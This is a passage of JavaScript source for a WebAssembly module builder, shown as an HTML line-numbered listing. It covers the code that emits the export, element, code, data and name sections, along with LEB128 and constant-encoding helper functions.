class="line-number" value="1972"></td><td class="line-content">      });</td></tr><tr><td class="line-number" value="1973"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="1974"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1975"></td><td class="line-content">    // Add export table.</td></tr><tr><td class="line-number" value="1976"></td><td class="line-content">    var exports_count = wasm.exports.length;</td></tr><tr><td class="line-number" value="1977"></td><td class="line-content">    if (exports_count &gt; 0) {</td></tr><tr><td class="line-number" value="1978"></td><td class="line-content">      if (debug) print('emitting exports @ ' + binary.length);</td></tr><tr><td class="line-number" value="1979"></td><td class="line-content">      binary.emit_section(kExportSectionCode, section =&gt; {</td></tr><tr><td class="line-number" value="1980"></td><td class="line-content">        section.emit_u32v(exports_count);</td></tr><tr><td class="line-number" value="1981"></td><td class="line-content">        for (let exp of wasm.exports) {</td></tr><tr><td class="line-number" value="1982"></td><td class="line-content">          section.emit_string(exp.name);</td></tr><tr><td class="line-number" value="1983"></td><td class="line-content">          section.emit_u8(exp.kind);</td></tr><tr><td class="line-number" value="1984"></td><td class="line-content">          section.emit_u32v(exp.index);</td></tr><tr><td class="line-number" value="1985"></td><td class="line-content">        }</td></tr><tr><td class="line-number" value="1986"></td><td class="line-content">      });</td></tr><tr><td class="line-number" value="1987"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="1988"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1989"></td><td class="line-content">    // Add start function section.</td></tr><tr><td class="line-number" value="1990"></td><td class="line-content">    if (wasm.start_index !== undefined) {</td></tr><tr><td class="line-number" value="1991"></td><td class="line-content">      if (debug) print('emitting start function @ ' + binary.length);</td></tr><tr><td class="line-number" value="1992"></td><td class="line-content">      binary.emit_section(kStartSectionCode, section =&gt; {</td></tr><tr><td class="line-number" value="1993"></td><td class="line-content">        section.emit_u32v(wasm.start_index);</td></tr><tr><td class="line-number" value="1994"></td><td class="line-content">      });</td></tr><tr><td class="line-number" value="1995"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="1996"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1997"></td><td class="line-content">    // Add element segments.</td></tr><tr><td class="line-number" value="1998"></td><td class="line-content">    if (wasm.element_segments.length &gt; 0) {</td></tr><tr><td class="line-number" value="1999"></td><td class="line-content">      if (debug) print('emitting element segments @ ' + binary.length);</td></tr><tr><td class="line-number" value="2000"></td><td class="line-content">      binary.emit_section(kElementSectionCode, section =&gt; {</td></tr><tr><td class="line-number" value="2001"></td><td class="line-content">        var segments = wasm.element_segments;</td></tr><tr><td class="line-number" value="2002"></td><td class="line-content">        section.emit_u32v(segments.length);</td></tr><tr><td class="line-number" value="2003"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="2004"></td><td class="line-content">        for (let segment of segments) {</td></tr><tr><td class="line-number" value="2005"></td><td class="line-content">          // Emit flag and header.</td></tr><tr><td class="line-number" value="2006"></td><td class="line-content">          // Each case below corresponds to a flag from</td></tr><tr><td class="line-number" value="2007"></td><td class="line-content">          // https://webassembly.github.io/spec/core/binary/modules.html#element-section</td></tr><tr><td class="line-number" value="2008"></td><td class="line-content">          // (not in increasing order).</td></tr><tr><td class="line-number" value="2009"></td><td class="line-content">          if (segment.is_active()) {</td></tr><tr><td class="line-number" value="2010"></td><td class="line-content">            if (segment.table == 0 &amp;&amp; segment.type === undefined) {</td></tr><tr><td class="line-number" value="2011"></td><td class="line-content">              if (segment.expressions_as_elements()) {</td></tr><tr><td class="line-number" value="2012"></td><td class="line-content">                section.emit_u8(0x04);</td></tr><tr><td class="line-number" value="2013"></td><td class="line-content">                section.emit_init_expr(segment.offset);</td></tr><tr><td class="line-number" value="2014"></td><td class="line-content">              } else {</td></tr><tr><td class="line-number" value="2015"></td><td class="line-content">                section.emit_u8(0x00)</td></tr><tr><td class="line-number" value="2016"></td><td class="line-content">                section.emit_init_expr(segment.offset);</td></tr><tr><td class="line-number" value="2017"></td><td class="line-content">              }</td></tr><tr><td class="line-number" value="2018"></td><td class="line-content">            } else {</td></tr><tr><td class="line-number" value="2019"></td><td class="line-content">              if (segment.expressions_as_elements()) {</td></tr><tr><td class="line-number" value="2020"></td><td class="line-content">                section.emit_u8(0x06);</td></tr><tr><td class="line-number" value="2021"></td><td class="line-content">                section.emit_u32v(segment.table);</td></tr><tr><td class="line-number" value="2022"></td><td class="line-content">                section.emit_init_expr(segment.offset);</td></tr><tr><td class="line-number" value="2023"></td><td class="line-content">                section.emit_type(segment.type);</td></tr><tr><td class="line-number" value="2024"></td><td class="line-content">              } else {</td></tr><tr><td class="line-number" value="2025"></td><td class="line-content">                section.emit_u8(0x02);</td></tr><tr><td class="line-number" value="2026"></td><td class="line-content">                section.emit_u32v(segment.table);</td></tr><tr><td class="line-number" value="2027"></td><td class="line-content">                section.emit_init_expr(segment.offset);</td></tr><tr><td class="line-number" value="2028"></td><td class="line-content">                section.emit_u8(kExternalFunction);</td></tr><tr><td class="line-number" value="2029"></td><td class="line-content">              }</td></tr><tr><td class="line-number" value="2030"></td><td class="line-content">            }</td></tr><tr><td class="line-number" value="2031"></td><td class="line-content">          } else {</td></tr><tr><td class="line-number" value="2032"></td><td class="line-content">            if (segment.expressions_as_elements()) {</td></tr><tr><td class="line-number" value="2033"></td><td class="line-content">              if (segment.is_passive()) {</td></tr><tr><td class="line-number" value="2034"></td><td class="line-content">                section.emit_u8(0x05);</td></tr><tr><td class="line-number" value="2035"></td><td class="line-content">              } else {</td></tr><tr><td class="line-number" value="2036"></td><td class="line-content">                section.emit_u8(0x07);</td></tr><tr><td class="line-number" value="2037"></td><td class="line-content">              }</td></tr><tr><td class="line-number" value="2038"></td><td class="line-content">              section.emit_type(segment.type);</td></tr><tr><td class="line-number" value="2039"></td><td class="line-content">            } else {</td></tr><tr><td class="line-number" value="2040"></td><td class="line-content">              if (segment.is_passive()) {</td></tr><tr><td class="line-number" value="2041"></td><td class="line-content">                section.emit_u8(0x01);</td></tr><tr><td class="line-number" value="2042"></td><td class="line-content">              } else {</td></tr><tr><td class="line-number" value="2043"></td><td class="line-content">                section.emit_u8(0x03);</td></tr><tr><td class="line-number" value="2044"></td><td class="line-content">              }</td></tr><tr><td class="line-number" value="2045"></td><td class="line-content">              section.emit_u8(kExternalFunction);</td></tr><tr><td class="line-number" value="2046"></td><td class="line-content">            }</td></tr><tr><td class="line-number" value="2047"></td><td class="line-content">          }</td></tr><tr><td class="line-number" value="2048"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="2049"></td><td class="line-content">          // Emit elements.</td></tr><tr><td class="line-number" value="2050"></td><td class="line-content">          section.emit_u32v(segment.elements.length);</td></tr><tr><td class="line-number" value="2051"></td><td class="line-content">          for (let element of segment.elements) {</td></tr><tr><td class="line-number" value="2052"></td><td class="line-content">            if (segment.expressions_as_elements()) {</td></tr><tr><td class="line-number" value="2053"></td><td class="line-content">              section.emit_init_expr(element);</td></tr><tr><td class="line-number" value="2054"></td><td class="line-content">            } else {</td></tr><tr><td class="line-number" value="2055"></td><td class="line-content">              section.emit_u32v(element);</td></tr><tr><td class="line-number" value="2056"></td><td class="line-content">            }</td></tr><tr><td class="line-number" value="2057"></td><td class="line-content">          }</td></tr><tr><td class="line-number" value="2058"></td><td class="line-content">        }</td></tr><tr><td class="line-number" value="2059"></td><td class="line-content">      })</td></tr><tr><td class="line-number" value="2060"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="2061"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="2062"></td><td class="line-content">    // If there are any passive data segments, add the DataCount section.</td></tr><tr><td class="line-number" value="2063"></td><td class="line-content">    if (wasm.data_segments.some(seg =&gt; !seg.is_active)) {</td></tr><tr><td class="line-number" value="2064"></td><td class="line-content">      binary.emit_section(kDataCountSectionCode, section =&gt; {</td></tr><tr><td class="line-number" value="2065"></td><td class="line-content">        section.emit_u32v(wasm.data_segments.length);</td></tr><tr><td class="line-number" value="2066"></td><td class="line-content">      });</td></tr><tr><td class="line-number" value="2067"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="2068"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="2069"></td><td class="line-content">    // If there are compilation hints add a custom section 'compilationHints'</td></tr><tr><td class="line-number" value="2070"></td><td class="line-content">    // after the function section and before the code section.</td></tr><tr><td class="line-number" value="2071"></td><td class="line-content">    if (wasm.compilation_hints.length &gt; 0) {</td></tr><tr><td class="line-number" value="2072"></td><td class="line-content">      if (debug) print('emitting compilation hints @ ' + binary.length);</td></tr><tr><td class="line-number" value="2073"></td><td class="line-content">      // Build custom section payload.</td></tr><tr><td class="line-number" value="2074"></td><td class="line-content">      let payloadBinary = new Binary();</td></tr><tr><td class="line-number" value="2075"></td><td class="line-content">      let implicit_compilation_hints_count = wasm.functions.length;</td></tr><tr><td class="line-number" value="2076"></td><td class="line-content">      payloadBinary.emit_u32v(implicit_compilation_hints_count);</td></tr><tr><td class="line-number" value="2077"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="2078"></td><td class="line-content">      // Defaults to the compiler's choice if no better hint was given (0x00).</td></tr><tr><td class="line-number" value="2079"></td><td class="line-content">      let defaultHintByte = kCompilationHintStrategyDefault |</td></tr><tr><td class="line-number" value="2080"></td><td class="line-content">          (kCompilationHintTierDefault &lt;&lt; 2) |</td></tr><tr><td class="line-number" value="2081"></td><td class="line-content">          (kCompilationHintTierDefault &lt;&lt; 4);</td></tr><tr><td class="line-number" value="2082"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="2083"></td><td class="line-content">      // Emit hint byte for every function defined in this module.</td></tr><tr><td class="line-number" value="2084"></td><td class="line-content">      for (let i = 0; i &lt; implicit_compilation_hints_count; i++) {</td></tr><tr><td class="line-number" value="2085"></td><td class="line-content">        let index = wasm.num_imported_funcs + i;</td></tr><tr><td class="line-number" value="2086"></td><td class="line-content">        var hintByte;</td></tr><tr><td class="line-number" value="2087"></td><td class="line-content">        if (index in wasm.compilation_hints) {</td></tr><tr><td class="line-number" value="2088"></td><td class="line-content">          let hint = wasm.compilation_hints[index];</td></tr><tr><td class="line-number" value="2089"></td><td class="line-content">          hintByte =</td></tr><tr><td class="line-number" value="2090"></td><td class="line-content">              hint.strategy | (hint.baselineTier &lt;&lt; 2) | (hint.topTier &lt;&lt; 4);</td></tr><tr><td class="line-number" value="2091"></td><td class="line-content">        } else {</td></tr><tr><td class="line-number" value="2092"></td><td class="line-content">          hintByte = defaultHintByte;</td></tr><tr><td class="line-number" value="2093"></td><td class="line-content">        }</td></tr><tr><td class="line-number" value="2094"></td><td class="line-content">        payloadBinary.emit_u8(hintByte);</td></tr><tr><td class="line-number" value="2095"></td><td class="line-content">      }</td></tr><tr><td class="line-number" value="2096"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="2097"></td><td class="line-content">      // Finalize as custom section.</td></tr><tr><td class="line-number" value="2098"></td><td class="line-content">      let name = 'compilationHints';</td></tr><tr><td class="line-number" value="2099"></td><td class="line-content">      let bytes = this.createCustomSection(name, payloadBinary.trunc_buffer());</td></tr><tr><td class="line-number" value="2100"></td><td class="line-content">      binary.emit_bytes(bytes);</td></tr><tr><td class="line-number" value="2101"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="2102"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="2103"></td><td class="line-content">    // Add function bodies.</td></tr><tr><td class="line-number" value="2104"></td><td class="line-content">    if (wasm.functions.length &gt; 0) {</td></tr><tr><td class="line-number" value="2105"></td><td class="line-content">      // emit function bodies</td></tr><tr><td class="line-number" value="2106"></td><td class="line-content">      if (debug) print('emitting code @ ' + binary.length);</td></tr><tr><td class="line-number" value="2107"></td><td class="line-content">      let section_length = 0;</td></tr><tr><td class="line-number" value="2108"></td><td class="line-content">      binary.emit_section(kCodeSectionCode, section =&gt; {</td></tr><tr><td class="line-number" value="2109"></td><td class="line-content">        section.emit_u32v(wasm.functions.length);</td></tr><tr><td class="line-number" value="2110"></td><td class="line-content">        let header;</td></tr><tr><td class="line-number" value="2111"></td><td class="line-content">        for (let func of wasm.functions) {</td></tr><tr><td class="line-number" value="2112"></td><td class="line-content">          if (func.locals.length == 0) {</td></tr><tr><td class="line-number" value="2113"></td><td class="line-content">            // Fast path for functions without locals.</td></tr><tr><td class="line-number" value="2114"></td><td class="line-content">            section.emit_u32v(func.body.length + 1);</td></tr><tr><td class="line-number" value="2115"></td><td class="line-content">            section.emit_u8(0);  // 0 locals.</td></tr><tr><td class="line-number" value="2116"></td><td class="line-content">          } else {</td></tr><tr><td class="line-number" value="2117"></td><td class="line-content">            // Build the locals declarations in separate buffer first.</td></tr><tr><td class="line-number" value="2118"></td><td class="line-content">            if (!header) header = new Binary;</td></tr><tr><td class="line-number" value="2119"></td><td class="line-content">            header.reset();</td></tr><tr><td class="line-number" value="2120"></td><td class="line-content">            header.emit_u32v(func.locals.length);</td></tr><tr><td class="line-number" value="2121"></td><td class="line-content">            for (let decl of func.locals) {</td></tr><tr><td class="line-number" value="2122"></td><td class="line-content">              header.emit_u32v(decl.count);</td></tr><tr><td class="line-number" value="2123"></td><td class="line-content">              header.emit_type(decl.type);</td></tr><tr><td class="line-number" value="2124"></td><td class="line-content">            }</td></tr><tr><td class="line-number" value="2125"></td><td class="line-content">            section.emit_u32v(header.length + func.body.length);</td></tr><tr><td class="line-number" value="2126"></td><td class="line-content">            section.emit_bytes(header.trunc_buffer());</td></tr><tr><td class="line-number" value="2127"></td><td class="line-content">          }</td></tr><tr><td class="line-number" value="2128"></td><td class="line-content">          // Set to section offset for now, will update.</td></tr><tr><td class="line-number" value="2129"></td><td class="line-content">          func.body_offset = section.length;</td></tr><tr><td class="line-number" value="2130"></td><td class="line-content">          section.emit_bytes(func.body);</td></tr><tr><td class="line-number" value="2131"></td><td class="line-content">        }</td></tr><tr><td class="line-number" value="2132"></td><td class="line-content">        section_length = section.length;</td></tr><tr><td class="line-number" value="2133"></td><td class="line-content">      });</td></tr><tr><td class="line-number" value="2134"></td><td class="line-content">      for (let func of wasm.functions) {</td></tr><tr><td class="line-number" value="2135"></td><td class="line-content">        func.body_offset += binary.length - section_length;</td></tr><tr><td class="line-number" value="2136"></td><td class="line-content">      }</td></tr><tr><td class="line-number" value="2137"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="2138"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="2139"></td><td class="line-content">    // Add data segments.</td></tr><tr><td class="line-number" value="2140"></td><td class="line-content">    if (wasm.data_segments.length &gt; 0) {</td></tr><tr><td class="line-number" value="2141"></td><td class="line-content">      if (debug) print('emitting data segments @ ' + binary.length);</td></tr><tr><td class="line-number" value="2142"></td><td class="line-content">      binary.emit_section(kDataSectionCode, section =&gt; {</td></tr><tr><td class="line-number" value="2143"></td><td class="line-content">        section.emit_u32v(wasm.data_segments.length);</td></tr><tr><td class="line-number" value="2144"></td><td class="line-content">        for (let seg of wasm.data_segments) {</td></tr><tr><td class="line-number" value="2145"></td><td class="line-content">          let shared_flag = seg.is_shared ? 0b1000 : 0;</td></tr><tr><td class="line-number" value="2146"></td><td class="line-content">          if (seg.is_active) {</td></tr><tr><td class="line-number" value="2147"></td><td class="line-content">            if (seg.mem_index == 0) {</td></tr><tr><td class="line-number" value="2148"></td><td class="line-content">              section.emit_u8(kActiveNoIndex | shared_flag);</td></tr><tr><td class="line-number" value="2149"></td><td class="line-content">            } else {</td></tr><tr><td class="line-number" value="2150"></td><td class="line-content">              section.emit_u8(kActiveWithIndex | shared_flag);</td></tr><tr><td class="line-number" value="2151"></td><td class="line-content">              section.emit_u32v(seg.mem_index);</td></tr><tr><td class="line-number" value="2152"></td><td class="line-content">            }</td></tr><tr><td class="line-number" value="2153"></td><td class="line-content">            section.emit_init_expr(seg.offset);</td></tr><tr><td class="line-number" value="2154"></td><td class="line-content">          } else {</td></tr><tr><td class="line-number" value="2155"></td><td class="line-content">            section.emit_u8(kPassive | shared_flag);</td></tr><tr><td class="line-number" value="2156"></td><td class="line-content">          }</td></tr><tr><td class="line-number" value="2157"></td><td class="line-content">          section.emit_u32v(seg.data.length);</td></tr><tr><td class="line-number" value="2158"></td><td class="line-content">          section.emit_bytes(seg.data);</td></tr><tr><td class="line-number" value="2159"></td><td class="line-content">        }</td></tr><tr><td class="line-number" value="2160"></td><td class="line-content">      });</td></tr><tr><td class="line-number" value="2161"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="2162"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="2163"></td><td class="line-content">    // Add any explicitly added sections.</td></tr><tr><td class="line-number" value="2164"></td><td class="line-content">    for (let exp of wasm.explicit) {</td></tr><tr><td class="line-number" value="2165"></td><td class="line-content">      if (debug) print('emitting explicit @ ' + binary.length);</td></tr><tr><td class="line-number" value="2166"></td><td class="line-content">      binary.emit_bytes(exp);</td></tr><tr><td class="line-number" value="2167"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="2168"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="2169"></td><td class="line-content">    // Add names.</td></tr><tr><td class="line-number" value="2170"></td><td class="line-content">    let num_function_names = 0;</td></tr><tr><td class="line-number" value="2171"></td><td class="line-content">    let num_functions_with_local_names = 0;</td></tr><tr><td class="line-number" value="2172"></td><td class="line-content">    for (let func of wasm.functions) {</td></tr><tr><td class="line-number" value="2173"></td><td class="line-content">      if (func.name !== undefined) ++num_function_names;</td></tr><tr><td class="line-number" value="2174"></td><td class="line-content">      if (func.numLocalNames() &gt; 0) ++num_functions_with_local_names;</td></tr><tr><td class="line-number" value="2175"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="2176"></td><td class="line-content">    if (num_function_names &gt; 0 || num_functions_with_local_names &gt; 0 ||</td></tr><tr><td class="line-number" value="2177"></td><td class="line-content">        wasm.name !== undefined) {</td></tr><tr><td class="line-number" value="2178"></td><td class="line-content">      if (debug) print('emitting names @ ' + binary.length);</td></tr><tr><td class="line-number" value="2179"></td><td class="line-content">      binary.emit_section(kUnknownSectionCode, section =&gt; {</td></tr><tr><td class="line-number" value="2180"></td><td class="line-content">        section.emit_string('name');</td></tr><tr><td class="line-number" value="2181"></td><td class="line-content">        // Emit module name.</td></tr><tr><td class="line-number" value="2182"></td><td class="line-content">        if (wasm.name !== undefined) {</td></tr><tr><td class="line-number" value="2183"></td><td class="line-content">          section.emit_section(kModuleNameCode, name_section =&gt; {</td></tr><tr><td class="line-number" value="2184"></td><td class="line-content">            name_section.emit_string(wasm.name);</td></tr><tr><td class="line-number" value="2185"></td><td class="line-content">          });</td></tr><tr><td class="line-number" value="2186"></td><td class="line-content">        }</td></tr><tr><td class="line-number" value="2187"></td><td class="line-content">        // Emit function names.</td></tr><tr><td class="line-number" value="2188"></td><td class="line-content">        if (num_function_names &gt; 0) {</td></tr><tr><td class="line-number" value="2189"></td><td class="line-content">          section.emit_section(kFunctionNamesCode, name_section =&gt; {</td></tr><tr><td class="line-number" value="2190"></td><td class="line-content">            name_section.emit_u32v(num_function_names);</td></tr><tr><td class="line-number" value="2191"></td><td class="line-content">            for (let func of wasm.functions) {</td></tr><tr><td class="line-number" value="2192"></td><td class="line-content">              if (func.name === undefined) continue;</td></tr><tr><td class="line-number" value="2193"></td><td class="line-content">              name_section.emit_u32v(func.index);</td></tr><tr><td class="line-number" value="2194"></td><td class="line-content">              name_section.emit_string(func.name);</td></tr><tr><td class="line-number" value="2195"></td><td class="line-content">            }</td></tr><tr><td class="line-number" value="2196"></td><td class="line-content">          });</td></tr><tr><td class="line-number" value="2197"></td><td class="line-content">        }</td></tr><tr><td class="line-number" value="2198"></td><td class="line-content">        // Emit local names.</td></tr><tr><td class="line-number" value="2199"></td><td class="line-content">        if (num_functions_with_local_names &gt; 0) {</td></tr><tr><td class="line-number" value="2200"></td><td class="line-content">          section.emit_section(kLocalNamesCode, name_section =&gt; {</td></tr><tr><td class="line-number" value="2201"></td><td class="line-content">            name_section.emit_u32v(num_functions_with_local_names);</td></tr><tr><td class="line-number" value="2202"></td><td class="line-content">            for (let func of wasm.functions) {</td></tr><tr><td class="line-number" value="2203"></td><td class="line-content">              if (func.numLocalNames() == 0) continue;</td></tr><tr><td class="line-number" value="2204"></td><td class="line-content">              name_section.emit_u32v(func.index);</td></tr><tr><td class="line-number" value="2205"></td><td class="line-content">              name_section.emit_u32v(func.numLocalNames());</td></tr><tr><td class="line-number" value="2206"></td><td class="line-content">              let name_index = 0;</td></tr><tr><td class="line-number" value="2207"></td><td class="line-content">              for (let i = 0; i &lt; func.local_names.length; ++i) {</td></tr><tr><td class="line-number" value="2208"></td><td class="line-content">                if (typeof func.local_names[i] == 'string') {</td></tr><tr><td class="line-number" value="2209"></td><td class="line-content">                  name_section.emit_u32v(name_index);</td></tr><tr><td class="line-number" value="2210"></td><td class="line-content">                  name_section.emit_string(func.local_names[i]);</td></tr><tr><td class="line-number" value="2211"></td><td class="line-content">                  name_index++;</td></tr><tr><td class="line-number" value="2212"></td><td class="line-content">                } else {</td></tr><tr><td class="line-number" value="2213"></td><td class="line-content">                  name_index += func.local_names[i];</td></tr><tr><td class="line-number" value="2214"></td><td class="line-content">                }</td></tr><tr><td class="line-number" value="2215"></td><td class="line-content">              }</td></tr><tr><td class="line-number" value="2216"></td><td class="line-content">            }</td></tr><tr><td class="line-number" value="2217"></td><td class="line-content">          });</td></tr><tr><td class="line-number" value="2218"></td><td class="line-content">        }</td></tr><tr><td class="line-number" value="2219"></td><td class="line-content">      });</td></tr><tr><td class="line-number" value="2220"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="2221"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="2222"></td><td class="line-content">    return binary.trunc_buffer();</td></tr><tr><td class="line-number" value="2223"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="2224"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="2225"></td><td class="line-content">  toArray(debug = false) {</td></tr><tr><td class="line-number" value="2226"></td><td class="line-content">    return Array.from(this.toBuffer(debug));</td></tr><tr><td class="line-number" value="2227"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="2228"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="2229"></td><td class="line-content">  instantiate(ffi, options) {</td></tr><tr><td class="line-number" value="2230"></td><td class="line-content">    let module = this.toModule(options);</td></tr><tr><td class="line-number" value="2231"></td><td class="line-content">    let instance = new WebAssembly.Instance(module, ffi);</td></tr><tr><td class="line-number" value="2232"></td><td class="line-content">    return instance;</td></tr><tr><td class="line-number" value="2233"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="2234"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="2235"></td><td class="line-content">  asyncInstantiate(ffi) {</td></tr><tr><td class="line-number" value="2236"></td><td class="line-content">    return WebAssembly.instantiate(this.toBuffer(), ffi)</td></tr><tr><td class="line-number" value="2237"></td><td class="line-content">        .then(({module, instance}) =&gt; instance);</td></tr><tr><td class="line-number" value="2238"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="2239"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="2240"></td><td class="line-content">  toModule(options, debug = false) {</td></tr><tr><td class="line-number" value="2241"></td><td class="line-content">    return new WebAssembly.Module(this.toBuffer(debug), options);</td></tr><tr><td class="line-number" value="2242"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="2243"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="2244"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="2245"></td><td class="line-content">  function wasmSignedLeb(val, max_len = 5) {</td></tr><tr><td class="line-number" value="2246"></td><td class="line-content">  if (val == null) throw new Error("Leb value may not be null/undefined");</td></tr><tr><td class="line-number" value="2247"></td><td class="line-content">  let res = [];</td></tr><tr><td class="line-number" value="2248"></td><td class="line-content">  for (let i = 0; i &lt; max_len; ++i) {</td></tr><tr><td class="line-number" value="2249"></td><td class="line-content">    let v = val &amp; 0x7f;</td></tr><tr><td class="line-number" value="2250"></td><td class="line-content">    // If {v} sign-extended from 7 to 32 bits is equal to val, we are done.</td></tr><tr><td class="line-number" value="2251"></td><td class="line-content">    if (((v &lt;&lt; 25) &gt;&gt; 25) == val) {</td></tr><tr><td class="line-number" value="2252"></td><td class="line-content">      res.push(v);</td></tr><tr><td class="line-number" value="2253"></td><td class="line-content">      return res;</td></tr><tr><td class="line-number" value="2254"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="2255"></td><td class="line-content">    res.push(v | 0x80);</td></tr><tr><td class="line-number" value="2256"></td><td class="line-content">    val = val &gt;&gt; 7;</td></tr><tr><td class="line-number" value="2257"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="2258"></td><td class="line-content">  throw new Error(</td></tr><tr><td class="line-number" value="2259"></td><td class="line-content">      'Leb value &lt;' + val + '&gt; exceeds maximum length of ' + max_len);</td></tr><tr><td class="line-number" value="2260"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="2261"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="2262"></td><td class="line-content">  function wasmSignedLeb64(val, max_len = 10) {</td></tr><tr><td class="line-number" value="2263"></td><td class="line-content">  if (val == null) throw new Error("Leb value may not be null/undefined");</td></tr><tr><td class="line-number" value="2264"></td><td class="line-content">  if (typeof val != "bigint") {</td></tr><tr><td class="line-number" value="2265"></td><td class="line-content">    if (val &lt; Math.pow(2, 31)) {</td></tr><tr><td class="line-number" value="2266"></td><td class="line-content">      return wasmSignedLeb(val, max_len);</td></tr><tr><td class="line-number" value="2267"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="2268"></td><td class="line-content">    val = BigInt(val);</td></tr><tr><td class="line-number" value="2269"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="2270"></td><td class="line-content">  let res = [];</td></tr><tr><td class="line-number" value="2271"></td><td class="line-content">  for (let i = 0; i &lt; max_len; ++i) {</td></tr><tr><td class="line-number" value="2272"></td><td class="line-content">    let v = val &amp; 0x7fn;</td></tr><tr><td class="line-number" value="2273"></td><td class="line-content">    // If {v} sign-extended from 7 to 32 bits is equal to val, we are done.</td></tr><tr><td class="line-number" value="2274"></td><td class="line-content">    if (BigInt.asIntN(7, v) == val) {</td></tr><tr><td class="line-number" value="2275"></td><td class="line-content">      res.push(Number(v));</td></tr><tr><td class="line-number" value="2276"></td><td class="line-content">      return res;</td></tr><tr><td class="line-number" value="2277"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="2278"></td><td class="line-content">    res.push(Number(v) | 0x80);</td></tr><tr><td class="line-number" value="2279"></td><td class="line-content">    val = val &gt;&gt; 7n;</td></tr><tr><td class="line-number" value="2280"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="2281"></td><td class="line-content">  throw new Error(</td></tr><tr><td class="line-number" value="2282"></td><td class="line-content">      'Leb value &lt;' + val + '&gt; exceeds maximum length of ' + max_len);</td></tr><tr><td class="line-number" value="2283"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="2284"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="2285"></td><td class="line-content">  function wasmUnsignedLeb(val, max_len = 5) {</td></tr><tr><td class="line-number" value="2286"></td><td class="line-content">  if (val == null) throw new Error("Leb value many not be null/undefined");</td></tr><tr><td class="line-number" value="2287"></td><td class="line-content">  let res = [];</td></tr><tr><td class="line-number" value="2288"></td><td class="line-content">  for (let i = 0; i &lt; max_len; ++i) {</td></tr><tr><td class="line-number" value="2289"></td><td class="line-content">    let v = val &amp; 0x7f;</td></tr><tr><td class="line-number" value="2290"></td><td class="line-content">    if (v == val) {</td></tr><tr><td class="line-number" value="2291"></td><td class="line-content">      res.push(v);</td></tr><tr><td class="line-number" value="2292"></td><td class="line-content">      return res;</td></tr><tr><td class="line-number" value="2293"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="2294"></td><td class="line-content">    res.push(v | 0x80);</td></tr><tr><td class="line-number" value="2295"></td><td class="line-content">    val = val &gt;&gt;&gt; 7;</td></tr><tr><td class="line-number" value="2296"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="2297"></td><td class="line-content">  throw new Error(</td></tr><tr><td class="line-number" value="2298"></td><td class="line-content">      'Leb value &lt;' + val + '&gt; exceeds maximum length of ' + max_len);</td></tr><tr><td class="line-number" value="2299"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="2300"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="2301"></td><td class="line-content">  function wasmI32Const(val) {</td></tr><tr><td class="line-number" value="2302"></td><td class="line-content">  return [kExprI32Const, ...wasmSignedLeb(val, 5)];</td></tr><tr><td class="line-number" value="2303"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="2304"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="2305"></td><td class="line-content">  // Note: Since {val} is a JS number, the generated constant only has 53 bits of</td></tr><tr><td class="line-number" value="2306"></td><td class="line-content">  // precision.</td></tr><tr><td class="line-number" value="2307"></td><td class="line-content">  function wasmI64Const(val) {</td></tr><tr><td class="line-number" value="2308"></td><td class="line-content">  return [kExprI64Const, ...wasmSignedLeb64(val, 10)];</td></tr><tr><td class="line-number" value="2309"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="2310"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="2311"></td><td class="line-content">  function wasmF32Const(f) {</td></tr><tr><td class="line-number" value="2312"></td><td class="line-content">  // Write in little-endian order at offset 0.</td></tr><tr><td class="line-number" value="2313"></td><td class="line-content">  data_view.setFloat32(0, f, true);</td></tr><tr><td class="line-number" value="2314"></td><td class="line-content">  return [</td></tr><tr><td class="line-number" value="2315"></td><td class="line-content">    kExprF32Const, byte_view[0], byte_view[1], byte_view[2], byte_view[3]</td></tr><tr><td class="line-number" value="2316"></td><td class="line-content">  ];</td></tr><tr><td class="line-number" 